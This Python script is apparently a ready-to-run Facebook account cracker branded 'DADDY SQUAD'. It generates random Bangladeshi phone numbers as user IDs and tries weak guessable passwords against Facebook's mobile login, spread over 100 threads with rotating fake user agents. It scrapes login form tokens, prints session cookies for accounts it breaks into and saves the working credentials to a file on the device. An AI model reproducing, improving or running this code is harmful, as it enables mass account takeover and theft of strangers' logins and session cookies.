import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
ugen=[]
uas=[]
for ua in range(5000):
      a='Mozilla/5.0 (Linux; Android'
      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
      d=random.randrange(40,115)
      e='0'
      f=random.randrange(3000,6000)
      g=random.randrange(20,100)
      h='Mobile Safari/537.36'
      ug=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(ug)
for ua in range(5000):
    a='NokiaX'
    b=random.randrange(1,9)
    c='-0'
    d=random.randrange(1,9)
    e='/'
    f=random.randrange(1,9)
    g='.0 ('
    h=random.randrange(1,12)
    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
    j='UNTRUSTED/'
    k=random.randrange(1,3)
    l='.0'
    uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
    ugen.append(uaku2)
os.system('xdg-open https://t.me/D_ADDY_10')
logo=(""" 
					\033[1;91m
 
________     _______       ________     ________     __  __
___  __ \    ___    |      ___  __ \    ___  __ \    _ \/ /
__  / / /    __  /| |      __  / / /    __  / / /    __  / 
_  /_/ /     _  ___ |      _  /_/ /     _  /_/ /     _  /  
/_____/      /_/  |_|      /_____/      /_____/      /_/

 

\033[33;1m   ▁ ▂ ▃ ▅ ▆ ▇ █ \033[1;35m𝙼𝙰𝚂𝚄𝙼_𝚂𝙾𝚁𝙳𝙰𝚁\033[33;1m █ ▇ ▆ ▅ ▃ ▂ ▁ 
 ──────────────────────────────────────────────────
\033[1;33m [\033[1;97m=\033[1;33m] AUTHOR  	 : DADDY SQUAD \033[1;32m              
\033[1;34m [\033[1;97m=\033[1;34m] FACEBOOK  	 : MASUM SORDAR                    
\033[1;35m [\033[1;97m=\033[1;35m] TELEGRAM 	 : D_ADDY_10         
\033[1;36m [\033[1;97m=\033[1;36m] VERSION 	 : \033[1;97m1.2\x1b[1;97m
\033[33;1m ──────────────────────────────────────────────────      
 \033[41m\033[1;37m DADDY SQUAD \x1b[0m    """)

 
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\033[38;5;46m'
M = '\033[1;31m'
H = '\033[38;5;46m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'

def mueor():
    user=[]
    os.system('clear')
    os.system('xdg-open https://t.me/D_ADDY_10')
    print(logo)
    print(' \033[1;91m[\033[1;97m+\033[1;91m]\033[1;33m SIM CODE BD  \033[1;97m016 - 017 - 018 - 019')
    nude = input(' \033[1;91m[\033[1;97m?\033[1;91m]\033[1;33m SIM CODE : \033[1;97m')
    nudex = ''.join(random.choice(string.digits) for _ in range(2))
    nud = ''.join(random.choice(string.digits) for _ in range(2))
    print( ' \033[1;91m[\033[1;97m+\033[1;91m]\033[1;97m 2000 - 5000 - 10000 - 15000 - 50000')
    limit = int(input(  ' \033[1;91m[\033[1;97m?\033[1;91m]\033[1;33m ENTER YOUR CRACK LIMIT : \033[1;97m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=100) as MUEOR:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\033[1;91m [\033[1;37m=\033[1;91m]\033[1;36m SIM CODE : \033[1;97m'+nude)
        print('\033[1;91m [\033[1;37m=\033[1;91m]\033[1;36m DADDY SQUAD ')
        print('\033[1;91m [\033[1;37m=\033[1;91m]\033[1;36m USE WI-FI THEN CONNECT \033[1;97m1.1.1.1\033[1;36m vpn \033[1;33m (BEST) ')
        print('\033[1;91m [\033[1;37m=\033[1;91m]\033[1;36m TOTAL ID : \033[1;97m'+tl)
        for guru in user:
            uid = nude+nudex+nud+guru
            pwx = [nude+nudex+nud+guru,nud+guru,nudex+guru,nude+nudex+nud,'bangla']
            MUEOR.submit(rcrack,uid,pwx,tl)
    print('\033[1;37m[\033[1;32m✔️\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            bi = random.choice([A,B,C,D,E,F,G,H])
            sys.stdout.write(f'\r \033[1;31m[%sONLY\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://p.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb ={'authority': 'p.facebook.com',
    'method': 'GET',
    'path': '/',
    'scheme': 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
    'cache-control': 'max-age=0',
    'dpr': '3',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"Infinix X676C"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"12.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent':pro,
    'viewport-width': '980',}
            lo = session.post('https://p.facebook.com/login/device-based/regular/login/?next=https://developers.facebook.com/tools/debug/&amp;refsrc=deprecated&amp;lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f"\033[38;5;46m[ONLY-OK] {uid}  {ps}" '  \n\033[1;33m [OK]\033[1;33mCookie = \033[1;32m'+coki+  ' \n\033[1;33m [ðŸ¤§] \033[1;32mUa = \033[1;34m'+pro+'  \033[0;97m')
                open('/sdcard/ONLY-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[ONLY-CP] {uid} {ps}")
                open('/sdcard/ONLY-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        
    except:
        pass

mueor()